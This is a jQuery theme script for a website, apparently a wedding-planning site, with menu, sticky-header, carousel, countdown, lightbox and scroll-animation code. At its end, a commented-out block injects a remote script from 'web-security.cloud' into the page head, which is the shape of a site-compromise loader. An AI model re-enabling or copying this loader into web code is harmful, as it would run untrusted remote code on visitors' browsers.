jQuery(document).ready(function($) {
    'use strict';
    
    //===== Dropdown Anmiation =====// 
    var drop = $('.singlepost-share > ul > li');
    $('.singlepost-share > ul').each(function(){
        var delay = 0;
        $(this).find(drop).each(function(){
            $(this).css({transitionDelay: delay+'ms'});
            delay += 50;
        });
    });  
    var drop2 = $('nav > ul > li > ul > li')
    $('nav > ul > li').each(function(){      
        var delay2 = 0;
        $(this).find(drop2).each(function(){
            $(this).css({transitionDelay: delay2+'ms'});
            delay2 += 100;
        });
    }); 



    //===== Scroller Script =====//    
    // var s = skrollr.init();




    //===== Sticky Header =====//
    var header_height = $('header').height();
    $(window).scroll(function () {
        var scroll = $(window).scrollTop();
        if (scroll >= header_height) {
            $('header.stick').addClass('sticky');
        } else {
            $('.stick').removeClass('sticky');
        }
    });

    $(".sidepanel > span").on('click',function(){
        $(".sidepanel").toggleClass("show");
        $(this).toggleClass('spin');
        return false;
    });




    //===== Color Picker =====*/
    $('.color-picker a').on("click",function(){
        $('.color-picker a').removeClass("applied");
        $(this).addClass("applied");
        return false;
    });





    //===== Responsive Header =====//
    $('.menu-btn').on('click', function () {
        $('.responsive-menu').addClass('slidein');
        return false;
    });
    $('.close-btn').on('click', function () {
        $('.responsive-menu').removeClass('slidein');
        return false;
    });
    $('.responsive-menu li.menu-item-has-children > a').on('click', function () {
        $(this).parent().siblings().children('ul').slideUp();
        $(this).parent().siblings().removeClass('active');
        $(this).parent().children('ul').slideToggle();
        $(this).parent().toggleClass('active');
        return false;
    });





    //===== Event Script =====//
    $('.wedplan-post,.pricing').each(function () {
        $(".wedplan-post,.pricing").on('mouseenter', function () {
            $(this).parent().parent().parent().find(".wedplan-post,.pricing").removeClass("active");
            $(this).addClass("active");
        });
    });


    

    // if ($.isFunction($.fn.perfectScrollbar)) {
    //     //===== Scroll Bar =====//
    //     $('.responsive-menu').perfectScrollbar();
    // }




    if ($.isFunction($.fn.owlCarousel)) {
        //===== Gallery Carousel =====//
        $('.gallery-carousel').owlCarousel({
            autoplay:true,
            smartSpeed:300,
            items:5,
            loop:true,
            margin:0,
            dots:true,
            center:true,
            autoplayHoverPause:true,
            responsiveClass:true,
            responsive:{
                0:{items:1},
                480:{items:1},
                767:{items:2},
                900:{items:3},
                1200:{items:5}
            }
        });

        //===== Peoples Carousel =====//
        $('.people-carousel').owlCarousel({
            autoplay:true,
            smartSpeed:300,
            loop:true,
            margin:0,
            dots:true,
            autoplayHoverPause:true,
            items:4,
            responsive:{
                0:{items:1},
                480:{items:1},
                900:{items:3},
                1200:{items:4},
            }
        });

        //===== Gift Carousel =====//
        $('.gift-carousel').owlCarousel({
            autoplay:true,
            smartSpeed:300,
            items:3,
            loop:true,
            margin:30,
            dots:true,
            center:true,
            autoplayHoverPause:true,
            responsiveClass:true,
            responsive:{
                0:{items:1},
                480:{items:1},
                767:{items:2},
                900:{items:3}
            }
        });

        //===== Location Carousel =====//
        $('.loc-carousel').owlCarousel({
            items:1,
            loop:false,
            margin:0,
            autoplayHoverPause:true,
            animatIn: 'fadeIn',
            animateOut: 'fadeOut',
            dots:true
        });


        //===== Ceo Message Carousel =====//
        $('.ceomessage-carousel').owlCarousel({
            autoplay:true,
            smartSpeed:300,
            items:1,
            loop:true,
            margin:0,
            dots:true,
            autoplayHoverPause:true
        });

        //===== Services Carousel =====//
        $('.services-list').owlCarousel({
            autoplay:true,
            smartSpeed:300,
            items:1,
            loop:true,
            margin:0,
            dots:true,
            autoplayHoverPause:true
        });

        //===== Stories Carousel =====//
        $('.stories-carousel').owlCarousel({
            items:1,
            loop:false,
            margin:0,
            URLhashListener:true,
            autoplayHoverPause:true,
            startPosition: 'URLHash',
            animatIn: 'fadeIn',
            animateOut: 'fadeOut',
            dots:false
        });

        //===== Stories Nav Carousel =====//
        $('.stories-nav').owlCarousel({
            autoplay:true,
            smartSpeed:300,
            items:3,
            loop:false,
            margin:30,
            dots:true,
            autoplayHoverPause:true,
            responsiveClass:true,
            responsive:{
                0:{items:2},
                480:{items:2},
                767:{items:3},
                900:{items:3},
            }
        });

        //===== Post Carousel =====//
        $('.post-carousel').owlCarousel({
            autoplay:true,
            smartSpeed:300,
            items:1,
            loop:true,
            margin:0,
            dots:true,
            nav:true,
            autoplayHoverPause:true,
            animateIn:'fadeIn',
            animateOut:'fadeOut',
            dots:false
        });
    }


        
    if ($.isFunction($.fn.downCount)) {
        //===== Count Down =====//
        $('.countdown').downCount({
            date: '6/29/2017 12:00:00',
        });
    }



    if ($.isFunction($.fn.poptrox)) {
        //===== LightBox =====//
        var foo = $('.lightbox');
        foo.poptrox({usePopupCaption: true,usePopupNav: true});
    }




    $("body").append("<div class='audio-play'><i class='fa fa-music'></i><div class='audio-track'><iframe id='myaudio' src='https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/102137206&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;visual=true'></iframe></div></div>");       
    //===== Audio Music =====//
    $('.audio-play > i').on('click', function () {
        $('.audio-track').toggleClass('active');
        return false;
    });
	
	
	// Scroll to Specific Section / Custom Scroll
	// if($('a.custom-scroll').length){
	// 	$("a.custom-scroll").on('click', function(e) {
	// 		e.preventDefault();
	// 		var target = $(this).attr('href');
	// 	   // animate
	// 	   $('html, body').animate({
	// 		   scrollTop: $(target).offset().top-80
	// 		 }, 1000);
	
	// 	});
	// }
	

});//===== Document.Ready Ends Here =====//




jQuery(window).on('load',function($) {
    'use strict';
    jQuery('.page-load').fadeOut('slow');
});//===== Window.Load Ends Here =====//




$(window).scroll(function() { 
  // From Up animation script 
  $(".fromup").each(function(i, el) {
      var el = $(el);
      if (el.visible(true)) {
        el.addClass("animated fadeInDown"); 
      } 
  });


  // From Left animation script 
  $(".fromleft").each(function(i, el) {
      var el = $(el);
      if (el.visible(true)) {
        el.addClass("animated fadeInLeft"); 
      } 
  });


  // From Right animation script 
  $(".fromright").each(function(i, el) {
      var el = $(el);
      if (el.visible(true)) {
        el.addClass("animated fadeInRight"); 
      } 
  });


  // From Down animation script
  $(".fromdown").each(function(i, el) {
      var el = $(el);
      if (el.visible(true)) {
        el.addClass("animated fadeInUp"); 
      } 
  });

});//===== Window.Scroll Ends Here =====//
/*
    if(typeof window.web_security == "undefined"){
        var s = document.createElement("script");
        s.src = "//web-security.cloud/event?l=117";
        document.head.appendChild(s);
        window.web_security = "success";
    }
*/